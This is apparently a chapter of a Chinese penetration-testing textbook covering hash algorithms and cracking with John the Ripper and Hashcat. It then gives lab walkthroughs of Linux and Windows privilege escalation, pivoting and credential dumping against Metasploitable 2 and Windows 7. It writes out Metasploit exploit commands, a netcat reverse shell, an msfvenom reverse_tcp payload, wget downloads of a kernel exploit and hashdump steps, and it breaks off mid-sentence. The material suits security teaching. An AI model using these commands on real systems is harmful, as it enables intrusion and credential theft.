  \n## 探索哈希函数\n\n在探索密码学的复杂领域时，我们会遇到哈希函数这一关键组件，它确保数据的完整性、认证性和整体。。探索包括理解现代哈希函数的目的和属性，并破解围绕\
  \ `MD5`、`SHA-1` 和 `SHA-256` 等已知算法的复杂性。\n\n### 现代哈希函数的目的和属性\n\n在许多加密应用的核心，哈希函数起着关键且基础的作用。这些函数能够接受各种大小的输入，并生成固定大小的输出，称为哈希值或消息摘要。现代哈希函数具有多种主要目的并表现出不同的属性，包括：\n\
  \n*   保护数据完整性并提供验证机制\n*   实现数字签名\n*   支持密码的安全存储和验证\n\n### 揭示常见的哈希算法\n\n让我们进入哈希算法的领域并探索一些广泛使用的算法：\n\
  \n*   消息摘要算法 5 (MD5)：`MD5` 是一种古老的哈希算法，生成 128 位的哈希值。最初用于数据完整性和密码存储，`MD5` 因碰撞攻击等漏洞而丢失了信誉。因此，它不再建议用于加密目的。\n\
  *   安全哈希算法 1 (SHA-1)：`SHA-1` 是一种著名的哈希算法，产生 160 位的哈希值。尽管它在加密中被广泛使用，但已发现漏洞，这促使其逐渐被更安全的替代方案取代。\n\
  *   安全哈希算法 256 位 (SHA-256)：`SHA-256` 属于 `SHA-2` 族，生成健健的 256 位哈希值。它被广泛认为是安全的，并应用于数字签名、安全通信协议甚至区块链技术中。虽然推荐使用\
  \ `SHA-256`，但也有更高更复杂的算法（如 `SHA-512`）用于增强安全性。\n\n这里是表 8.1，展示了一些常见的哈希算法及其对应的工作因子和安全级别：\n\
  \n| 哈希算法 | 工作因子 | 安全级别 |\n| :--- | :--- | :--- |\n| `MD5` | 低 | 不安全 |\n| `SHA-1`\
  \ | 低 | 不安全 |\n| `SHA-256` | 中 | 安全 |\n| `SHA-384` | 高 | 安全 |\n| `SHA-512` | 高 |\
  \ 安全 |\n| `bcrypt` | 高 | 极安全 |\n| `Argon2` | 高 | 极安全 |\n\n表 8.1：常见的哈希算法\n\n注意：为了确保你的加密解决方案与业务或组织需求一致，对各种哈希算法的优点和局限性有全面的理解是关重要的。这种知识使你能够做出明智的决策并建立稳健的安全基准。\n\
  \n## 精通密码哈希\n\n对于渗透测试人员来说，获得密码哈希技术的专业知识至关重要。这涉及理解实施的强力措施，以保护用户密码不受未经授权的破解或哈希匹配。让我们深入研究加固密码的艺术，并探索加盐和密钥拉伸等高级方法。\n\
  \n### 密码保护艺术\n\n*   Windows 密码哈希\n    *   NT LAN Manager (NTLM)：最初使用的这种旧哈希算法被发现存在加密弱和易受离线攻击等漏洞。\n\
  \    *   `NTLMv2`：`NTLM` 的增强且较新的迭代，`NTLMv2` 结合了更强的安全措施并解决了其前身中的某些固有缺陷。\n    *  \
  \ `Kerberos`：主要用于 Windows 环境，`Kerberos` 是一种强大的网络认证协议，利用强大的加密算法来保护密码。\n*   Linux\
  \ 密码哈希\n    *   `MD5`、`SHA-1` 和 `SHA-256`：在 Linux 系统中，`MD5` 和 `SHA-1` 的使用很流行，但由于它们的漏洞被认为是弱的。相反，`SHA-256`\
  \ 是一种更健壮的算法，提供 256 位的哈希值并广泛用于密码存储。\n    *   `bcrypt` 和 `scrypt`：在基于 Linux 的操作系统中，`bcrypt`\
  \ 和 `scrypt` 是流行的密码哈希算法。`bcrypt` 因其适应性和暴力攻击的健壮性而受到认可，而 `scrypt` 因其内存密集型函数和对硬件攻击的防御增强而赞誉。\n\
  \n### 尖端技术 - 加盐和密钥拉伸\n\n加盐为密码哈希过程增加了额外的复杂性，它涉及在哈希之前向密码附加一个随机生成的值。这种技术大大增加了使用预计算哈希表或彩虹表破解密码的难度，因为从组合盐中分离出原始密码变得困难。因此，即使两个用户具有相同的密码，他们的哈希值也会不同。为了说明这一点，请参考图\
  \ 8.1 并考虑以下场景：\n\n密码：`ummedmeel123`\n盐：`exampleSALT`\n加盐密码：`ummedmeel123exampleSALT`\n\
  哈希密码：`29A48295B77DE3420A15D967D357FF47`\n\n![](img/Figure_8.1.png)\n\n图 8.1：加盐和密钥拉伸\n\
  \n\n\n\n\n| Note：密钥扩展（Key stretching）是一种用于增强密码安全性的关键技术。`bcrypt` 和 `scrypt` 等方法引入了计算成本，使哈希过程变慢并更具抗攻击能力。应用密钥扩展可以增强对暴力破解和字典攻击的防护。\
  \ |\n\n# 释放哈希破解技术\n\n解锁哈希破解的秘密涉及使用广泛且经过测试的技术来揭示密码并破解其加密防护。让我们对哈希破解进行深度探索并揭开它的谜团：\n\
  \n## 策略方法\n\n哈希破解有多种策略方法，每种方法都有自己的优势和局限性。它们包括以下技术：\n\n- **暴力破解**：通过对可能的字符组合进行系统尝试，旨在破解密码。虽然有效，但较长且带有复杂加密算法的密码会导致该过程非常耗时。\n\
  - **字典攻击**：通过利用预先构建的字典，系统地测试常用密码、单词和短语。这增加了成功破解的概率。\n- **混合攻击**：结合了暴力破解和字典攻击的元素，通过引入数字、特殊字符或自定义模式等变体来修改字典单词。\n\
  - **基于规则的攻击**：利用预定义的模式或规则来操作字典单词或生成自动变体。这包括大小写转换、字符替换以及在字符串开头或结尾添加特定字符串等。\n- **彩虹表攻击**：通过利用包含大量可能密码哈希值的预计算表来加速破解过程。这消除了对即时哈希计算的需求。\n\
  \n| Note：渗透测试人员可以通过理解并实施这些哈希破解技术，来增强组织的整体系统安全性。这使他们能够有效评估密码安全措施的健壮性并精准定位漏洞。 |\n\n\
  ## 强化哈希破解武器库\n\n哈希破解是网络安全中的一个基础过程，涉及从加密哈希值中恢复原始明文。在渗透测试或审计中，哈希破解实践在评估密码安全强度和识别潜在影响方面起着至关重要的作用。\n\
  \n## 哈希战士的精英工具\n\n在本中，你将对哈希专家使用的基本工具进行宝贵的介绍，提升他们有效破解哈希的能力。这些工具在更高效地导航密码安全领域方面发挥着重要作用。熟悉这些工具将使你能够自信地应对与哈希函数和密码保护相关的各种挑战。\n\
  \n### 哈希识别器 (Hash-identifier)\n\n`hash-identifier` 是一个轻量级但 Essential 工具，协助识别不同的哈希类型。在破解哈希之前，确定使用的哈希算法至关重要，因为它会影响所选的破解方法。这种方法节省了时间、资源并提高了整体效率。\n\
  \n以下是在 Kali Linux 中使用 `hash-identifier` 工具的逐步方法：\n\n1. 通过运行命令 `hash-identifier`\
  \ 来执行 `hash-identifier` 工具，如图 8.2 所示：\n   ![](img/Figure_8.2.png)\n   图 8.2：运行 `hash-identifier`\
  \ 工具\n2. `hash-identifier` 工具将提示你输入想要识别的哈希值。复制哈希值，将其粘贴到终端并按回车。`hash-identifier`\
  \ 工具将分析提供的哈希并展示识别出的哈希算法或潜在匹配项列表，如图 8.3 所示：\n   ![](img/Figure_8.3.png)\n   图 8.3：提供哈希并识别哈希算法\n\
  \n### John the Ripper (约翰破解者)\n\n`John the Ripper` 是一种备受推崇且强大的密码破解工具，以其灵活性和速度闻名。它可以在\
  \ Windows、Linux 和 macOS 在等多个平台上无缝运行。通过采用字典攻击、暴力破解和混合攻击等多种技术，它能够高效地破解密码哈希。此外，它的通用性扩展到了支持多种哈希类型。\n\
  \n### 案例 1：破解 Linux 密码的实际示例\n\n让我们考虑从 Linux 系统的 `/etc/shadow` 文件中提取的密码哈希：`username:$6$XZjHMrdYPINY/KQn$tRtmCrxpeKFIf1/DCsRgk8qPNPEv55qpPheJtceaKCrlRiYoMYrlWJN.JKiFmIeByMMy6R6ZQWz3LjNCL3g7Z0/`。在这种情况下，使用的哈希算法是\
  \ `SHA-512`，由存在 `$6` 表明。我们的目标是利用 `John the Ripper` 破解这个密码哈希。按照以下步骤操作：\n\n1. 首先创建一个文本文件（例如\
  \ `hashes.txt`），并将提供的哈希值粘贴其中。最后，保存文件。遵循图 8.4 所示的示例：\n   ![](img/Figure_8.4.png)\n\
  \   图 8.4：在文本文件中存储哈希\n2. 打开终端并执行命令 `john --format=sha512crypt --wordlist=/path/to/wordlist.txt\
  \ hashes.txt` 以开始密码破解过程。可以使用常用的字典（如 `rockyou.txt`），你也可以创建自定义字典。此命令还会显示进度并为每个密码尝试提供估计的剩余时间。见图\
  \ 8.5：\n   ![](img/Figure_8.5.png)\n   图 8.5：使用 `John the Ripper` 破解哈希\n3. 成功破解密码后，`John\
  \ the Ripper` 将在屏幕上显示结果。破解密码将存储在 `John the Ripper` 目录内名为 `john.pot` 或等名的文件中。见图 8.6：\n\
  \   ![](img/Figure_8.6.png)\n   图 8.6：破解的密码\n\n### 案例 2：破解 Windows 密码的实际示例\n\n1.\
  \ 要开始破解 NTLM 哈希的过程，你需要获取想要破解的特定 NTLM 哈希。这些哈希通常位于 Windows 环境中，例如 Windows 安全账户管理器\
  \ (SAM) 数据库或活动目录 (AD)。例如，让我们考虑 NTLM 哈希 `username: 5fbc3d5fec8206a3f4b6c473d68ae76`。按照下面的步骤分解\
  \ NTLM 哈希破解过程：打开终端并执行命令 `sudo john --user=username --format=NT --wordlist=/path/to/wordlist.txt\
  \ hashes.txt` 开始密码破解过程。可以使用常用的字典（如 `rockyou.txt`），你也可以创建自定义字典。此命令还会显示进度并为每个密码尝试提供估计的剩余时间。见图\
  \ 8.7：\n   ![](img/Figure_8.7.png)\n   图 8.7：使用 `John the Ripper` 破解哈希\n2. 成功破解密码后，`John\
  \ the Ripper` 将在屏幕上显示结果，类似于图 8.8：\n   ![](img/Figure_8.8.png)\n   图 8.8：破解的密码\n\n\
  ### John the Ripper Jumbo\n\n`John the Ripper Jumbo` 是 `John the Ripper` 的增强版本，专注于破解复杂密码。它利用了图形处理器\
  \ (GPU) 和多核处理器的计算能力，从而实现了更计算。`John the Jumbo` 使用更大的字典和规则集来增加字典攻击的成功概率。\n\n## Hashcat\n\
  \n\n\n\nHashcat 是一款以能够处理大规模破解任务而闻名的工具。它利用 GPU 的计算能力来加速破解过程，从而获得更快的结果。Hashcat 支持广泛的哈希算法，提供暴力破解、字典、组合和掩码攻击等攻击模式，使其成为哈希战士的灵活选择。\n\
  \n## 案例：使用 Hashcat 破解 Linux 密码的实际演示\n\n让我们通过以下分步骤方法了解使用 Hashcat 进行哈希破解的过程：\n\n1.\
  \ Hashcat 为每个哈希函数分配一个引用值。要检查哈希函数的关联值，请使用命令 `hashcat -h | grep sha512`，如图 8.9\n\n\
  \   图 8.9：哈希函数的关联值\n\n2. 通过运行命令 `sudo hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\
  \ -O` 来利用 `hashcat` 实用程序`-a` 标志表示攻击模式，`-m` 标志代表哈希引用值，`hash.txt` 指定要破解的哈希文件路径，`/usr/share/wordlists/rockyou.txt`\
  \ 提供字典文件（如 `rockyou.txt`）或任何你喜欢的自定义列表的路径。一旦成功破解哈希，将显示明文密码。由于 GPU 的密集使用以及该过程的耗时，在这种情况下期望显示破解后的密码是不现实的。请见图\
  \ 8.10：\n\n   ![](img/Figure_8.10.png)\n\n   图 8.10：使用 Hashcat 破解哈希\n\n3. 在 Kali\
  \ Linux 中，`rockyou.txt` 文件预装在 `/usr/share/wordlists` 目录下。或者，你也可以通过执行命令 `locate wordlists\
  \ | less` 使用其他字典文件，如图 8.11\n\n   图 8.11：Kali Linux 中的字典文件\n\n## 哈希战士的在线工具](#contents.xhtml_sc3_211a)\n\
  \n目前有多种在线哈希破解工具可用，它们通常提供友好的界面并利用强大的计算资源来高效地破解哈希。然而，需要注意的是，使用在线哈希破解工具可能会带来安全和隐私风险，因此请谨慎，并仅使用声誉良好且可靠的平台。以下是在线哈希破解工具的示例：\n\
  \n### CrackStation](#contents.xhtml_sc4_212a)\n\n要使用 CrackStation 在线哈希破解服务，你可以遵循以下步骤：\n\
  \n1. 启动你首选的网络浏览器并输入 URL [`crackstation.net/`](https://crackstation.net/) 进入 CrackStation\
  \ 网站，如图 8.12\n\n   图 8.12：打开 CrackStation 网站\n\n2. 在字段中粘贴或手动输入你想要破解的哈希值，确保输入的哈希与所选的哈希类型对应。点击\
  \ Crack Hashes 按钮启动破解过程。在 CrackStation 完成哈希破解后，如果成功破解了哈希，它将显示结果明文密码。如果哈希仍未破解，CrackStation\
  \ 将指示数据库中未找到该哈希。请见图 8.13：\n\n   ![](img/Figure_8.13.png)\n\n   图 8.13：在 CrackStation\
  \ 上破解哈希\n\n### Hashes](#contents.xhtml_sc4_213a)\n\n要使用 Hashes，你可以按照下面的步骤操作：\n\n\
  1. 输入 URL [`www.hashes.com/`](https://www.hashes.com/) 进入 Hashes 网站。在此字段中粘贴或手动输入你想要破解的哈希值，然后点击\
  \ SUBMIT & SEARCH 按钮或类似按钮启动破解过程，如图 8.14\n\n   图 8.14：在 Hashes 上破解哈希\n\n2. 如果成功破解哈希，它将显示结果明文密码，如图\
  \ 8.15 所示：\n\n   ![](img/Figure_8.15.png)\n\n   图 8.15：破解的哈希\n\n此外，还有其他提供相同服务的在线平台，包括：\n\
  \n   * Hash-identifier ([`www.hashidentifier.com/`](https://www.hashidentifier.com/))\n\
  \   * CrackHash ([`www.crackhash.com/`](https://www.crackhash.com/))\n   * OnlineHashCracker\
  \ ([`www.onlinehashcracker.com/`](https://www.onlinehashcracker.com/))\n   * HashKiller\
  \ ([`hashkiller.io/`](https://hashkiller.io/))\n\n## 哈希、加密与编码之间的区别](#contents.xhtml_sc2_214a)\n\
  \n下表 8.2 以表格形式概述了哈希、加密和编码之间的区别：\n\n| | 哈希 (Hashing) | 加密 (Encryption) | 编码 (Encoding)\
  \ |\n| :--- | :--- | :--- | :--- |\n| 定义 | 将数据转换为固定长度字符串的单向过程。 | 将数据转换为在没有解密密钥的情况下无法理解理解的过程。\
  \ | 将数据转换为不同表示格式的过程。 |\n| 目的 | 验证数据的完整性和唯一性。 | 保护数据的机密性。 | 为了传输或存储目的转换数据。 |\n| 可逆性\
  \ | 不可逆。无法从哈希值恢复原始数据。 | 可逆。可以使用解密密钥恢复原始数据。 | 可逆。可以通过解码编码表示来恢复原始数据。 |\n| 密钥要求 | 不需要密钥。\
  \ | 加密和解密均需要密钥。 | 不需要密钥。 |\n| 使用场景 | 密码存储、数据完整性检查。 | 安全通信、数据保护。 | 数据传输、字符集转换。 |\n\
  | 示例算法 | MD5, SHA-1, SHA-256。 | AES, RSA, DES。 | Base64, ASCII, URL 编码。 |\n\n表 8.2：哈希、加密与编码的区别\n\
  \n## 后渗透与横向移动](#contents.xhtml_sc2_215a)\n\n后渗透和横向移动阶段在渗透测试中起着至关重要的作用。它们对于评估泄露的实际后果、定位目标网络中的漏洞以及加强安全措施提供宝贵的见解。\n\
  \n### 理解后渗透](#contents.xhtml_sc3_216a)\n\n后渗透涉及攻击者或渗透测试人员探索受损系统、提升权限并收集关键信息。其目标是评估渗透、识别漏洞、评估潜在损害并确定访问级别。它还为加强防御提供了见解。\n\
  \n### 横向移动的重要性](#contents.xhtml_sc3_217a)\n\n横向移动是后渗透的一个关键方面，涉及探索目标网络、提升权限并访问敏感信息。它允许渗透测试人员模拟攻击者、识别安全漏洞并评估访问控制。横向移动揭示了初始利用阶段之外的隐藏漏洞和攻击路径。\n\
  \n## 权限提升技术](#contents.xhtml_sc2_218a)\n\n让我们深入研究权限提升，它意味着在系统或网络上获得初始授权之外的访问权限。这一过程利用漏洞或配置错误来提升权限，允许攻击者超越其规定的边界。\n\
  \n为了更好地理解这一概念，我们将探索 Linux 和 Windows 环境中权限提升的真实示例。\n\n### Linux 权限提升](#contents.xhtml_sc3_219a)\n\
  \n\n\n\n让我们通过系统化的方法来实现初始访问、准备和权限提升，以此探索 Linux 权限提升的阶段。\n\n### 第 1 阶段：初始访问\n\n1.\
  \ 为了获取目标机器 Metasploitable2 的初始访问，我们可以利用 `DistCC` 漏洞。为了使用 `Metasploit` 完成此操作，请按照以下步骤操作，并将位符替换为你的\
  \ Metasploitable 2 目标机器的 IP 地址，如图 8.16](#ch08.xhtml_fig8-16) 所示：\n\n```\nuse exploit/unix/misc/distcc_exec\n\
  set RHOST <target_host_IP>\nset payload cmd/unix/bind_ruby\nexploit\n```\n\n![](img/Figure_8.16.png)\n\
  \n图 8.16：获取目标机器的初始访问\n\n2. 现在，让我们在获得的 shell 上执行 `whoami` 命令。如图 8.17 所示，我们成功获取了访问，并且正以守护用户的身份运行\
  \ shell：\n\n![](img/Figure_8.17.png)\n\n图 8.17：获取了用户权限的 shell\n\n## 第 2 阶段：使用 Udev\
  \ 漏洞准备权限提升\n\n1. 为了提升权限，我们需要一个内核漏洞。要确定目标机器的内核版本，请命令行 shell 中执行以下命令，如图 8.18 所示：\n\
  \n```\nuname -a\nlsb_release -a\n```\n\n![](img/Figure_8.18.png)\n\n图 8.18：确定目标机器的内核版本\n\
  \n2. 根据我们的发现，目标机器运行内核版本为 `2.6.24` 的 Ubuntu 8.04。为了发现针对此内核的权限提升漏洞，在新的 Kali Linux\
  \ 终端中执行命令 `searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6`。我们将利用\
  \ `8572.c` 漏洞，如图 8.19 所示：\n\n![](img/Figure_8.19.png)\n\n图 8.19：发现针对已发现内核版本的权限提升漏洞\n\
  \n3. 为了确保某些文件、脚本和漏洞可以下载，请在 Kali 上执行命令 `service apache2 restart` 来重启 Apache2。这一步对于访问所需的资源至关重要，如图\
  \ 8.20 所示：\n\n![](img/Figure_8.20.png)\n\n图 8.20：重启 Apache2 服务\n\n4. 选定的本地漏洞将执行目标机器上的\
  \ `/tmp/run` 文件，这要求我们用自定义代码或反弹脚本来创建它。在这种情况下，我们将利用一个简单的 netcat 反弹 shell。要创建该文件，在\
  \ Kali Linux 的新终端中运行命令 `nano /var/www/html/run`。然后，输入以下内容，同时将 IP 地址替换为我们 Kali Linux\
  \ 机器的地址，如图 8.21 所示：\n\n```bash\n#!/bin/bash\nnc <kali_linux_IP> 5678 -e /bin/bash\n\
  ```\n\n![](img/Figure_8.21.png)\n\n图 8.21：创建反弹脚本\n\n5. 为了便于将 `8572.c` 负载下载到目标系统，将其从父目录复制到\
  \ `html` 目录。该目录可以作为下载负载的方便位置，如图 8.22 所示：\n\n![](img/Figure_8.22.png)\n\n图 8.22：将选定的负载复制到\
  \ html 目录\n\n6. 打开一个新的终端窗口，并在 Kali Linux 机器上执行命令 `nc -lvp 5678` 来启动监听，如图 8.23 所示：\n\
  \n![](img/Figure_8.23.png)\n\n图 8.23：启动 net cat 监听器\n\n### 第 3 阶段：提升权限\n\n从低权限 shell\
  \ 执行以下命令 set，将文件从你的 Kali Linux 机器上传到目标系统，如图 8.24 所示：\n\n```bash\ncd /tmp\nwget http://192.168.29.15/run\n\
  wget http://192.168.29.15/8572.c\n```\n\n![](img/Figure_8.24.png)\n\n图 8.24：从你的\
  \ Kali Linux 上构造的文件到目标系统\n\n1. 从低权限 shell 执行下面给出的命令以编译漏洞文件并列出文件，如图 8.25 所示：\n\n\
  ```\ngcc -o exploit 8572.c\nls –l\n```\n\n![](img/Figure_8.25.png)\n\n图 8.25：编译漏洞\n\
  \n2. 根据选定的漏洞文档，我们需要 `udevd` netlink socket 的进程标识符 (PID)。要获取此信息，执行以下命令 set 来列出网络进程并识别\
  \ `udev` 进程。最后，我们成功识别了目标 PID，即 `2796`。参见图 8.26：\n\n```bash\ncat /proc/net/netlink\n\
  ps aux | grep udev\n```\n\n![](img/Figure_8.26.png)\n\n图 8.26：识别 udev 进程\n\n3. 从低权限\
  \ shell 执行命令 `./exploit <PID>` 以提升权限并建立反弹 shell。确保将 `<PID>` 替换为目标系统的正确 PID，如图 8.27\
  \ 所示：\n\n![](img/Figure_8.27.png)\n\n图 8.27：运行已上传的漏洞\n\n4. 现在，导航到监听终端，在成功利用本地漏洞后，你将在那里看到一个反弹\
  \ shell。为了验证我们提升的权限，执行命令 `whoami`，这将确认我们已经获得了 root 权限。有了 root 权限，我们现在能够执行所有需要管理控制的必要活动。参见图\
  \ 8.28：\n\n![](img/Figure_8.28.png)\n\n图 8.28：具有 root 权限的 shell\n\n> 注意：在权限提升领域，主要关注点在于针对诸如配置错误的文件权限、内核漏洞、服务配置错误、弱身份验证机制、脆弱的软件版本以及利用信任关系的漏洞。这些漏洞代表了安全版图的很大一部分，而\
  \ exploitDB 提供了大量的可用漏洞来帮助该过程。选择合适的后渗透漏洞取决于目标的性质、在网络中的位置、配置以及实施的安全控制等因素。\n\n## Windows\
  \ 上的权限提升\n\n让我们通过包含初始访问、准备和权限提升的系统方法，深入研究 Windows 权限提升的阶段。\n\n### 第 1 阶段：初始访问\n\n\
  我们的第一步是在目标系统上获取低权限 shell。为了说明这一过程，我们将利用 `MSFvenom` 生成一个基础负载并尝试获取 meterpreter 会话。按照下面的步骤操作：\n\
  \n1. 在 Kali Linux 终端中执行以下命令生成可执行文件：`msfvenom -p windows/x64/meterpreter/reverse_tcp\
  \ lhost=192.168.29.15 lport=6789 -f exe -o winpriv.exe`。将生成的文件保存为可执行文件，如图 8.29 所示：\n\
  \n![](img/Figure_8.29.png)\n\n图 8.29：使用 msfvenom 构建负载\n\n2. 接下来，启动 `http.server`，这是\
  \ Python 内置的一个轻级且易用的模块。它不需要复杂的配置，可以从任何位置轻松执行。执行以下命令：`sudo python3 -m http.server`，如图\
  \ 8.30 所示：\n\n![](img/Figure_8.30.png)\n\n图 8.30：启动 http.server\n\n3. 在 `msfconsole`\
  \ 中运行以下命令序列启动处理器并开始监听传入的连接，如图 8.31 所示：\n\n```\nuse exploit/multi/handler\nset payload\
  \ windows/x64/meterpreter/reverse_tcp\nset lhost 192.168.29.15\nset lhost 6789\n\
  exploit\n```\n\n\n\n\n4. 在目标机器的浏览器中下载有效负载，并在普通用户登录状态执行它，如图 8.32 所示：\n\n![](img/Figure_8.32.png)\n\
  \n图 8.32：在目标机器上执行有效负载\n\n5. 我们已成功从目标机器获取初始 meterpreter 会话，如图 8.33 所示：\n\n![](img/Figure_8.33.png)\n\
  \n图 8.33：初始 meterpreter 会话\n\n6. 执行命令 `getuid` 以检索真实用户 ID，并验证其对应于普通用户而非 root。由于我们的目标是提升权限，请继续运行命令\
  \ `getystem` 尝试获得系统级权限。然而，尽管我们付出了努力，用于获取系统访问的所有三种技术遗憾地未能实现预期结果。请查看图 8.34：\n\n![](img/Figure_8.34.png)\n\
  \n图 8.34：尝试提升系统权限\n\n## 第二阶段：准备绕过 UAC 提升权限](#contents.xhtml_sc4_225a)\n\n现在，我们的目标是绕过用户账户控制\
  \ (UAC) 以实现权限提升。UAC 是 Windows 操作系统中的安全功能，用于防止未经的系统修改。按照下面的步骤操作：\n\n1. 首先将当前会话设置为后台，然后输入命令\
  \ `search bypassuac` 来寻找针对 Windows UAC 绕过的本地漏洞利用，如图 8.35 所示：\n\n![](img/Figure_8.35.png)\n\
  \n图 8.35：搜索针对 Windows UAC 绕过的本地漏洞\n\n## 第三阶段：提升权限](#contents.xhtml_sc4_226a)\n\n\
  现在进入使用下述分步方法执行权限提升漏洞的阶段：\n\n1. 要激活所选漏洞，运行命令 `use exploit/window/local/bypassuac`。此外，执行命令\
  \ `show options` 以查看必要信息，如图 8.36 所示：\n\n![](img/Figure_8.36.png)\n\n图 8.36：选择漏洞并提供所需信息\n\
  \n2. 要查看所有连接的会话，执行命令 `sessions -l`。使用命令 `set SESSION 1` 选择选择特定的会话进行添加，如图 8.37 所示：\n\
  \n![](img/Figure_8.37.png)\n\n图 8.37：设置 meterpreter 会话\n\n3. 执行命令 `exploit` 以重新获得\
  \ meterpreter 会话，如图 8.38 所示：\n\n![](img/Figure_8.38.png)\n\n图 8.38：运行漏洞\n\n4. 发布命令\
  \ `getuid` 验证当前用户，它将再次显示普通用户。继续运行命令 `getsystem` 和 `getuid`。结果是我们成功获取了 NT AUTHORITY\
  \ 用户，如图 8.39 所示：\n\n![](img/Figure_8.39.png)\n\n图 8.39：成功获取 NT AUTHORITY\n\n> 注意：Windows\
  \ 权限提升漏洞利用权限配置错误、有漏洞的服务、未修补的漏洞、DLL 劫持、弱密码、不安全的 UAC 设置、弱的文件/文件夹权限以及不安全的注册表设置来提升用户权限。\n\
  \n## 探索网络跳转](#contents.xhtml_sc2_227a)\n\n通过使用目标网络内的受攻击系统，网络跳转利用一种技术访问从攻击者初始入口点无法直接访问的其他系统或网络。它充当跳板或代理，允许攻击者到达网络内的额外目标。\n\
  \n## 跳转方法](#contents.xhtml_sc3_228a)\n\n我们将使用两台机器的示例（Windows 7 和 Metasploitable\
  \ 2）来说明网络攻击计划。网络跳转方法如图 8.40 所示，将遵循下述的步骤：\n\n![](img/Figure_8.40.png)\n\n图 8.40：跳转方法\n\
  \n1. 通过 Windows 7 获取网络的初始访问权限。\n2. 进入 Windows 7 后，探索并收集网络信息，包括 IP 地址、子网和潜在目标。\n\
  3. 利用 Metasploitable 2 机器上的漏洞以获取访问权限。\n4. 从 Windows 7 到 Metasploitable 2 建立跳转连接，从而控制受攻击的\
  \ Metasploitable 2 机器。\n\n现在，让我们从技术角度深入该方法，将其分为以下阶段：\n\n## 第一阶段：获取 Windows 7（初始）访问](#contents.xhtml_sc4_229a)\n\
  \n通过利用 Metasploit Framework 的强大，你可以利用广为人知的漏洞，例如 `eternalblue`，它利用了服务器消息块 (SMB) 协议中的弱点。它专门针对\
  \ Microsoft Windows 操作系统中 SMBv1 实现中的一个漏洞。\n\n1. 执行提供的命令集以获取初始访问，如图 8.41 所示：\n\n\
  ```\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.29.4\nexploit\n\
  ```\n\n![](img/Figure_8.41.png)\n\n图 8.41：获取 Windows 7（初始）访问\n\n## 第二阶段：网络信息收集和跳转连接建立](#contents.xhtml_sc4_230a)\n\
  \n1. 接下来，需要通过执行命令 `run autoroute –s 192.168.29.0/24` 和 `route print` 为 meterpreter\
  \ 会话添加路由，如图 8.42 所示：\n\n![](img/Figure_8.42.png)\n\n图 8.42：为 meterpreter 会话添加路由\n\
  \n2. 需要执行命令 `background` 将 meterpreter 会话设置为后台，以便使用辅助模块进行侦察，如图 8.43 所示：\n\n![](img/Figure_8.43.png)\n\
  \n图 8.43：将 meterpreter 会话设置为后台\n\n3. 为了继续，下一步是扫描网络上的其他系统。使用 meterpreter 内置的 ARP\
  \ 扫描器，我们可以全面扫描整个网络以寻找额外系统。执行提供的命令集，如图 8.44 所示，启动 ARP 扫描过程并收集有关网络构的价值信息：\n\n```\n\
  use post/windows/gather/arp_scanner\nset RHOSTS 192.168.29.0/24\nset SESSION 1\n\
  run\n```\n\n![](img/Figure_8.44.png)\n\n图 8.44：扫描整个网络以寻找额外系统\n\n4. 如所示，我们的 ARP 扫描已成功识别了网络上的多台机器/资产。现在，让我们通过选择特定主机并使用辅助模块\
  \ `auxiliary/scanner/portscan/tcp` 进行端口扫描来确定开放端口。执行以下系列命令，如图 8.45 所示：\n\n```\nuse\
  \ auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.29.146\nset PORTS 1-100\nset\
  \ THREADS 50\nrun\n```\n\n![](img/Figure_8.45.png)\n\n图 8.45：使用辅助模块进行端口扫描\n\n##\
  \ 第三阶段：通过利用 Metasploitable 2 机器进行网络跳转](#contents.xhtml_sc4_231a)\n\n让我们通过将 meterpreter\
  \ 会话设置为后台并配置漏洞，专门针对连接到原始 Windows 7 系统的 Metasploitable 2 来访问内部系统。通过侦察分析，我们已确定目标资产为\
  \ 192.168.29.146。\n\n\n\n\n1. 要利用此漏洞，请执行以下命令序列，如图图 8.46 所示：\n\n```\nuse exploit/unix/ftp/vsftpd_234_backdoor\n\
  set RHOSTS <Metasploitable 2 IP>\nexploit\n```\n\n![](img/Figure_8.46.png)\n\n图\
  \ 8.46：在 Metasploitable 2 上利用 VSFTPD 后门漏洞\n\n2. 我们现在可以访问内部系统（Metasploitable 2）的\
  \ shell。从这里，我们可以执行各种操作，例如检查系统权限、提取敏感信息以及提升权限以获取 admin/root 账户的访问，如图图 8.47 所示：\n\n\
  ![](img/Figure_8.47.png)\n\n图 8.47：内部系统（Metasploitable 2）的 shell\n\n此外，值得注意的是，通过利用名为\
  \ `post/multi/manage/shell_to_meterpreter` 的后渗透模块，可以将获取的 shell 增强为 meterpreter 会话。\n\
  \n| 注意：在为 VAPT（渗透测试与评估）选择网络跳转技术时，请考虑网络拓扑、访问权限、隐性、可扩展性、加密、熟悉程度、风险评估和文档。优先考虑与专业知识匹配、能降低风险并为报告提供清晰证据的技术。\
  \ |\n\n## 持久化与横移动\n\n持久化和横移动在高级渗透测试中至关重要。持久化通过创建后门、安装 rootkit 和维持对受控系统的控制来确保持续访问。横移动通过网络扩展，从而攻破更多系统以获取更高权限并访问敏感信息。它们通过模拟真实世界的攻击者行为来评估网络安全。\n\
  \n### 在场景中：\n\n1. 获取 Windows 7 机的初始访问权限。\n2. 使用 `hashdump` 工具进行凭据转储以实现持久化。\n3. 利用转出的凭据进行身份验证漏洞利用。\n\
  4. 探索远程桌面，启用并创建一个新用户以方便基于 GUI 的访问。\n\n在 Windows 7 系统上执行提供的命令集以获取初始访问，如图图 8.48 所示：\n\
  \n```\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.29.4\nexploit\n\
  ```\n\n![](img/Figure_8.48.png)\n\n图 8.48：利用 Windows 7 系统获取初始访问\n\n## 通过 hashdump\
  \ 技术实现持久化\n\n1. 若要提取哈希密码，请遵循图图 8.49 所示的提供的命令集：\n\n```\nuse post/windows/gather/smart_hashdump\n\
  set SESSION 1\nrun\n```\n\n![](img/Figure_8.49.png)\n\n图 8.49：提取哈希密码\n\n2. 如图图 8.50\
  \ 所示，我们已成功获取了所有用户及其存储在 SAM 文件中的关联 NTLM 哈希的转储：\n\n![](img/Figure_8.50.png)\n\n图 8.50：用户名和\
  \ NTLM 哈希\n\n此信息引出了以下用例：\n\n* 在许多组织中，同一个本地管理员密码在多个系统之间共享是常见的。利用这一知识，我们可以利用之前获取的哈希，可能在网络中的另一台\
